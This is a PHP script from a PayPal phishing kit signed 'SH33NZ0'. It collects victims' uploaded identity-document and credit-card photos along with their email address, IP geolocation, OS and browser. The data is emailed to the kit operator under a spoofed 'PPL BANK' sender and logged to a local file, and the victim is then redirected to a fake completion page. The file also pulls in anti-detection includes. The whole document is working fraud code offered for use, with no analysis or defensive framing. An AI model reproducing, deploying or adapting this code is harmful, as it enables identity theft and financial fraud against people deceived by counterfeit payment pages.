<?php @error_reporting();session_start();require_once '../anti/anti0.php';require '../anti/anti1.php';require '../anti/anti2.php';require '../anti/anti3.php';require '../anti/anti4.php';include 'config.php';if(isset($_FILES['id_image'])&&isset($_FILES['cc_image'])){$accepted=array('png','jpg','gif','pdf');$ext=pathinfo($_FILES['id_image']['name'],PATHINFO_EXTENSION);$ext2=pathinfo($_FILES['cc_image']['name'],PATHINFO_EXTENSION);if(!in_array(strtolower($ext),$accepted)){exit(header("Location: myaccount/identity.php?sessionid={$_SESSION['randString']}&sslmode=true"));}if(!in_array(strtolower($ext2),$accepted)){exit(header("Location: identity.php?sessionid={$_SESSION['randString']}&sslmode=true"));}if(move_uploaded_file($_FILES['id_image']['tmp_name'],'../proof/id_'.$_SESSION['ip']."_".$_SESSION['ip_countryCode'].".".strtolower($ext))){$uploads_dir="";foreach($_FILES as $key=>$file){$base=$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'].'/../../proof/';$new_name="id_".$_SESSION['ip']."_".$_SESSION['ip_countryCode'].".".strtolower($ext);$uploads_dir=$base.$new_name;$moved=move_uploaded_file($file['tmp_name'][0],$uploads_dir);$files['files']['name']=$file['name'][0];$files['files']['new_name']=$new_name;$files['files']['url']=$uploads_dir;}move_uploaded_file($_FILES['cc_image']['tmp_name'],'../proof/cc_'.$_SESSION['ip']."_".$_SESSION['ip_countryCode'].".".strtolower($ext2));$uploads_dir2="";foreach($_FILES as $key=>$file){$base2=$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'].'/../../proof/';$new_name2="cc_".$_SESSION['ip']."_".$_SESSION['ip_countryCode'].".".strtolower($ext2);$uploads_dir2=$base2.$new_name2;$moved=move_uploaded_file($file['tmp_name'][0],$uploads_dir2);$files['files']['name']=$file['name'][0];$files['files']['new_name']=$new_name2;$files['files']['url']=$uploads_dir2;}$code=<<<EOT
########### [ New PayPal ID | {$dateNow} GMT]  #####################
℗[ID's Email]   ✪: {$_SESSION['email']}
℗[ID Path]	    ✪: {$uploads_dir}
℗[CC Path]	    ✪: {$uploads_dir2}
=-=-=-=-=-=-=-=-- ♣ ☠ |SH33NZ0| ☠ ♣-=-=-=-=-=-=-=-
✪[IP]			✪: {$_SESSION['ip']}
✪[Country]		✪: {$_SESSION['ip_countryName']}
✪[State]	    ✪: {$_SESSION['ip_state']}
✪[City]			✪: {$_SESSION['ip_city']}
✪[Zip] 			✪: {$_SESSION['ip_zip']}
✪[OS]			✪: {$_SESSION['os']}
✪[Browser]		✪: {$_SESSION['browser']}
✪[TimeZone]		✪: {$_SESSION['ip_timezone']}
########### [ ./New PayPal ID ]  #####################
\r\n\r\n
EOT;
$subject="Thank |☠SH33NZ0☠| New PayPal ID [{$_SESSION['email']}] From [{$_SESSION['ip_countryName']}]";
$headers="From: |☠SH33NZ0☠| PPL BANK <SH33NZ0@GMAIL.COM>\r\n";
$headers.="MIME-Version: 1.0\r\n";
$headers.="Content-Type: text/plain; charset=UTF-8\r\n";
@mail($yours,$subject,$code,$headers);$save=fopen("../stored.txt","a+");fwrite($save,$code);fclose($save);exit(header("Location: myaccount/completed.php?sessionid={$_SESSION['randString']}&sslmode=true"));}else{exit(header("Location: myaccount/identity.php?sessionid={$_SESSION['randString']}&sslmode=true"));}}else{exit(header("Location: index.php"));}?>